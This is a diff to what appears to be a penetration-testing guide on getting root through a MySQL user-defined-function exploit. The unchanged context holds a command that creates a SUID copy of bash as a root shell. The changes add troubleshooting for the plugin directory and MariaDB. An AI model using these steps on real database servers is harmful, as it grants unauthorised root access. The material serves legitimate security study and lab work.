@@ -193,10 +193,6 @@ mysql> select do_system('cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell');
 
 ```
 
-Depending on the version of MySQL you will have to change plugin directory. Here in version 5 it is `/usr/lib/mysql/plugin/`.
-
-In the original exploit description they just write to `/usr/lib/` (presumably for version 4). Do some googling.
-
 To gain a root shell just execute the copied bash binary:
 
 ```bash
@@ -208,6 +204,20 @@ root
 -p flag to keep the SUID, bash would otherwise automatically drop it.
 
 
+### Troubeshooting
+
+If the file copied to the plugin directory has byte size 0, then mysql could not read your .so file. Pick a different source directory.
+
+Depending on the version of MySQL you will have to change plugin directory. Here in version 5 it is `/usr/lib/mysql/plugin/`.
+
+In the original exploit description they just write to `/usr/lib/` (presumably for version 4). Do some googling.
+
+You might be able to figure out the plugin directory with:
+
+```bash
+mysql> show variables like 'plugin_dir';
+```
+
 ### MariaDB
 
 This alsow works for affected MariaDB versions, but the plugin directory is different:
@@ -218,3 +228,4 @@ This alsow works for affected MariaDB versions, but the plugin directory is diff
 ```
 
 Might require some research on your end.
+
